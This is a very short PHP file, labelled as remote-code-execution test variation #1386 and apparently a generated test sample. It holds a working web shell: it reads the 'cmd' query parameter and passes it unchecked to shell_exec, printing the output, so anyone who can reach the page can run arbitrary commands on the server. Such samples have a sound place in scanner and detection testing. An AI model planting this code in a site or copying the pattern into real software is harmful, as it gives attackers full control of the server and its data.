<?php
// RCE test variation #1386
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>